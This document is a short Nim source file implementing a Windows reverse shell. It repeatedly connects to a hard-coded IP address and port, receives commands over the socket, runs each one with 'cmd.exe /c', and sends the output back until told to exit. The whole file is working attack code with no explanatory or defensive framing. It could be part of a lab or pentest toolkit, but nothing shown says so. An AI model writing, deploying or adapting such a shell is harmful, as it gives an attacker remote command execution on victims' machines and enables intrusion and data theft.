import std/osproc
import std/times
import net
import os
import streams

let ip = "192.168.88.98"
let port = 4443

var exitLoop = false

while not exitLoop:
    try:
        echo now(), " Attempting to connect to ", ip, " on port ", port
        var socket = newSocket()
        socket.connect(ip, Port(port))
        echo now(), " Connected!"
        while true:
            try:
                socket.send(">")
                var command = socket.recvLine()

                if command == "exit":
                    socket.send("Connection closed.\n")
                    socket.close()
                    exitLoop = true
                    break

                if command.len > 0:
                    let (output, exitCode) = execCmdEx("cmd.exe /c " & command)
                    socket.send(output & "\n")
                else:
                    socket.send("No command received.\n")
            except:
                echo now(), " Error sending response: ", getCurrentExceptionMsg()
                break
    except:
        echo now(), " Unable to connect to ", ip, " on port ", port, " ", getCurrentExceptionMsg()
        sleep(2000)
